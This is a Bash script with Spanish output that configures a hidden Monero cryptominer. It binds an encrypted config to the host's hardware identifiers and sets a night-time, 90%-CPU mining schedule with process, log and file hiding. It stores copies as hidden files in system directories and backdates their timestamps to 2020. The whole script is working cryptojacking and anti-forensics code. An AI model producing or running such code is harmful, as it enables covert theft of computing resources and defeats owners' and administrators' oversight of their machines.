#!/bin/bash

echo "[*] Configuración de Wallet Monero"

read -p "Tu dirección Monero: " WALLET

if [ ${#WALLET} -ne 95 ] && [ ${#WALLET} -ne 106 ]; then
    echo "[-] Error: Longitud inválida de wallet"
    exit 1
fi

PREFIX=${WALLET:0:1}
if [ "$PREFIX" != "4" ] && [ "$PREFIX" != "8" ]; then
    echo "[-] Error: Prefijo inválido (debe ser 4 u 8)"
    exit 1
fi

echo "[+] Generando clave única del sistema..."
CPU_SERIAL=$(grep -i "serial" /proc/cpuinfo | head -1 | cut -d: -f2 | tr -d ' ')
MACHINE_ID=$(cat /etc/machine-id 2>/dev/null || echo "unknown")
DISK_SERIAL=$(lsblk -o SERIAL 2>/dev/null | head -2 | tail -1)
HOSTNAME=$(hostname)

SYSTEM_KEY=$(echo "${CPU_SERIAL}${MACHINE_ID}${DISK_SERIAL}${HOSTNAME}" | sha256sum | cut -d' ' -f1)

CONFIG_DATA=$(cat << EOF
{
  "wallet": {
    "address": "$WALLET",
    "pool_url": "pool.supportxmr.com:443",
    "encrypted": true
  },
  "schedule": {
    "start_hour": 23,
    "start_minute": 30,
    "end_hour": 6,
    "end_minute": 30,
    "enabled": true
  },
  "cpu": {
    "max_percent": 90,
    "reserved_cores": 1
  },
  "stealth": {
    "hide_process": true,
    "no_logs": true,
    "hide_files": true
  }
}
EOF
)

echo "[+] Encryptando configuración..."
ENCRYPTED=$(echo "$CONFIG_DATA" | openssl enc -aes-256-cbc -salt -pass pass:"$SYSTEM_KEY" -base64)

LOCATIONS=(
    "/etc/.systemd/.config.dat"
    "/usr/share/.config/.sysconfig"
    "/var/lib/.cache/.config"
)

for LOC in "${LOCATIONS[@]}"; do
    echo "[+] Guardando en: $LOC"
    mkdir -p $(dirname "$LOC")
    echo "$ENCRYPTED" > "$LOC"
    chmod 600 "$LOC"
    
    BASENAME=$(basename "$LOC")
    HIDDEN_LOC=$(dirname "$LOC")/."$BASENAME"
    mv "$LOC" "$HIDDEN_LOC"
    
    touch -t 202001010000 "$HIDDEN_LOC"
done

echo "[+] Configuración completada"
echo "[+] La wallet solo funcionará en ESTE sistema"
